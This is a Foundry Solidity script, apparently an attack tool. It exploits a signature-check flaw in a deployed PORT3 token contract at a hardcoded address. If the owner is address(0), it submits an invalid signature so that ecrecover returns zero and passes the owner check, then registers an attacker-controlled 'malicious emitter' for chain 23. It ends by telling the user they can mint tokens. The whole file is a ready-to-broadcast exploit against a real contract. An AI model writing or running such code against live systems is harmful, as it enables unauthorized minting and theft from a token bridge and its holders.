// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IPORT3 {
    struct SignatureVerification {
        address signer;
        uint256 nonce;
        bytes signature;
    }
    
    function registerChain(uint16 chainId, bytes32 tokenContract, SignatureVerification memory signatureArguments) external;
    function tokenContracts(uint16 chainId) external view returns (bytes32);
    function owner() external view returns (address);
}

contract ExploitEcrecoverVulnerabilityScript is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(privateKey);
        address port3Address = 0xb4357054c3dA8D46eD642383F03139aC7f090343;
        
        vm.startBroadcast(privateKey);
        
        IPORT3 port3 = IPORT3(port3Address);
        
        console.log("=== Step 1: Check Current State ===");
        console.log("PORT3 Contract:", port3Address);
        console.log("Attacker:", attacker);
        
        address currentOwner = port3.owner();
        console.log("Current owner:", currentOwner);
        
        if (currentOwner != address(0)) {
            console.log("Owner is not address(0), aborting...");
            vm.stopBroadcast();
            return;
        }
        
        bytes32 currentEmitter = port3.tokenContracts(23);
        console.log("Current emitter for chain 23:");
        console.logBytes32(currentEmitter);
        console.log("");
        
        console.log("=== Step 2: Prepare Malicious Emitter ===");
        address maliciousContract = 0x4644BBcfd26a79A79254aF30ed8Ab80658a73B32;
        bytes32 emitter = bytes32(uint256(uint160(maliciousContract)));
        console.log("Malicious emitter:", maliciousContract);
        console.log("");
        
        console.log("=== Step 3: Construct Unique Invalid Signature ===");
        
        // ✅ 关键修改: 创建唯一的无效签名
        bytes memory uniqueSignature = new bytes(65);
        
        // 方法1: 使用时间戳作为熵
        uint256 entropy = block.timestamp;
        uniqueSignature[0] = bytes1(uint8(entropy));
        uniqueSignature[1] = bytes1(uint8(entropy >> 8));
        uniqueSignature[2] = bytes1(uint8(entropy >> 16));
        
        // 或者方法2: 简单地修改一个字节
        // uniqueSignature[64] = 0x42;  // 任意非零值
        
        console.log("Signature (first 10 bytes):");
        for (uint i = 0; i < 10 && i < uniqueSignature.length; i++) {
            console.logBytes1(uniqueSignature[i]);
        }
        console.log("");
        
        IPORT3.SignatureVerification memory sigArgs = IPORT3.SignatureVerification({
            signer: attacker,
            nonce: type(uint256).max,
            signature: uniqueSignature
        });
        
        console.log("Signature arguments:");
        console.log("  signer:", sigArgs.signer);
        console.log("  nonce:", sigArgs.nonce);
        console.log("  signature: 65 bytes (unique)");
        console.log("");
        
        console.log("=== Step 4: Register Malicious Emitter ===");
        console.log("Calling PORT3.registerChain...");
        
        try port3.registerChain(23, emitter, sigArgs) {
            console.log("");
            console.log("Transaction succeeded!");
            
            bytes32 registered = port3.tokenContracts(23);
            console.log("");
            console.log("=== Step 5: Verify Registration ===");
            console.log("Registered emitter:");
            console.logBytes32(registered);
            
            if (registered == emitter) {
                console.log("");
                console.log("==================================================");
                console.log("  SUCCESS! Vulnerability Exploited!");
                console.log("==================================================");
                console.log("");
                console.log("Exploit summary:");
                console.log("1. PORT3 owner = address(0)");
                console.log("2. Used invalid signature (ecrecover returns 0x0)");
                console.log("3. 0x0 == owner(0x0) -> passed!");
                console.log("4. Malicious emitter registered!");
                console.log("");
                console.log("You can now use your VAA to mint tokens!");
            }
        } catch Error(string memory reason) {
            console.log("");
            console.log("Transaction failed:", reason);
        } catch (bytes memory lowLevelData) {
            console.log("");
            console.log("Transaction failed with low-level error:");
            console.logBytes(lowLevelData);
        }
        
        vm.stopBroadcast();
    }
}